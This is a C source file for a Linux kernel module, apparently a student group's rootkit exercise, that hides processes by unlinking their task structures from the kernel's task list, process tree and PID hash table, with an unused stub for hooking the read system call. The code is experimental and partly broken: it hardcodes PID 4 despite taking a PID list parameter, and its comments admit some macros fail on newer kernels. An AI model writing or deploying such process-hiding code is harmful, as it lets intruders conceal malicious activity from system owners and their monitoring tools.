#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/list.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"


/* the followin macros are taken from linux kernel source code (2.6.11)
   they probably remove a task from the task list - have to try it out */
// note that they don't seem to work in linux 2.6.32
#define REMOVE_LINKS(p) do {                                    \
        if (thread_group_leader(p))                             \
                list_del_init(&(p)->tasks);                     \
        remove_parent(p);                                       \
        } while (0)

#define SET_LINKS(p) do {                                       \
        if (thread_group_leader(p))                             \
                list_add_tail(&(p)->tasks,&init_task.tasks);    \
        add_parent(p, (p)->parent);                             \
        } while (0)

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);

fun_ssize_t_int_pvoid_size_t     original_read;

struct hlist_head* pid_hash_table;

static int pids_to_hide[200];
static int pids_count = 0;
module_param_array(pids_to_hide, int, &pids_count, 0000);
MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");

typedef struct task_struct* (*fun_task_struct_pid_t) (pid_t);

void hide_processes_hash(void){
    int i;
    struct task_struct* task;
    pid_hash_table = (struct hlist_head*) ptr_pid_hash;
    for (i = 1; i<10; ++i){
        task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(i);
        if (task){
            OUR_DEBUG("Read from hash table: %s [%d]\n", task->comm, task->pid);
        }
    }
    task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(4);
    struct pid_link tmp = task->pids[0];
    hlist_del_rcu(&(tmp.node));
}

void hide_processes_traverse_tree(struct task_struct* root_task, int depth){
    struct task_struct* task;
    struct task_struct* prev;
    struct task_struct* next;
    struct list_head* next_ptr;
    struct list_head* prev_ptr;
    struct list_head* p;
    char  padding[6][5] = {
        "", " ", "  ", "   ", "    ", "     ", 
    };

    if (root_task->children.next == &root_task->children){
        //OUR_DEBUG(" %s [%d] has no children\n", root_task->comm, root_task->pid);
        return;
    }

    task = list_entry(root_task->children.next, struct task_struct, sibling);
    while (1) {
        OUR_DEBUG("%s %s [%d]\n", padding[depth+1], task->comm, task->pid);
        if (task->sibling.next == &root_task->children){
            break;
        }
        prev_ptr = task->sibling.prev;
        next_ptr = task->sibling.next;
        if (task->pid == 4){
            OUR_DEBUG("Removing task 4 from the tree\n");
            prev_ptr->next = next_ptr;
            next_ptr->prev = prev_ptr;
        }
        hide_processes_traverse_tree(task, depth+1);

        // now the next task
        next = list_entry(task->sibling.next, struct task_struct, sibling);
        task = next;
    } 
}

void hide_processes(void){
    struct task_struct* task;
    struct task_struct* prev;
    struct task_struct* next;
    task = &init_task;
    prev = NULL;
    OUR_DEBUG("Simple task list:\n");
    do {
        // the previous task (prev) is obtained by a expanded macro
        // found in the linux kernel. it is basically the
        // adapted expansion of "next_task"
        prev = list_entry(task->tasks.prev, struct task_struct, tasks);
        next = next_task(task);
        OUR_DEBUG("%s [%d], (%d, %d)\n", task->comm, task->pid, prev->pid, next->pid);
        if (task->pid > 0){ // somethin has 0, which shall not be taken into consideration
            hide_processes_traverse_tree(task, 0);
        }
        // the following routine seems to correctly 
        // remove elements from the tasks list
        if (task->pid == 4){
            prev->tasks.next = task->tasks.next;
            next->tasks.prev = task->tasks.prev;
        }
    } while ((task = next) != &init_task);
}


/* Initialization routine */
static int __init _init_module(void)
{
    int i;
    struct task_struct *task;

    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");

    printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
    for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
        printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
    }

    hide_processes_hash(); // note that this is apparently the only thing necessary to hide the process

    // hide_processes();
    // hide_processes();
    for_each_process(task)
    {
   printk("%s [%d]\n",task->comm , task->pid);
    }


    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
